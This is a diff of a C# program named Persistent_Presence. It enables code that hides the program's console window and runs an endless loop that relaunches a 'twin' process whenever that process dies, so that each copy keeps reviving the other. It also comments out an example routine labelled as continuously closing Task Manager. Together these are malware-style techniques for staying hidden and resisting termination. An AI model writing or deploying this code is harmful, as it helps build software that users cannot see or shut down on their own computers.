@@ -22,19 +22,20 @@ namespace Persistent_Presence
         {
             Persistent_Presence main_program = new Persistent_Presence();
             main_program.check_executable_location();
-            /*
+            
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE); // Hide
 
-            Background_Process_Twin main_program = new Background_Process_Twin();
+            Background_Process_Twin main_program2 = new Background_Process_Twin();
             while (true)
             {
                 Thread.Sleep(1000); // Sleep reduces CPU Usage from 40% down to 2.1%.
-                if (main_program.check_processes() == false)
+                if (main_program2.check_processes() == false)
                 {
                     Debug.WriteLine("[*] Twin Process Dead [2]");
-                    main_program.execute_twin_process();
+                    main_program2.execute_twin_process();
                 }
+                /*
                 #region Example of practical usage (Continuously closes task manager).
                 try
                 {
@@ -51,8 +52,9 @@ namespace Persistent_Presence
                     Debug.WriteLine(ex);
                 }
                 #endregion
+                */
             }
-        */
+        
         }
     }
 }
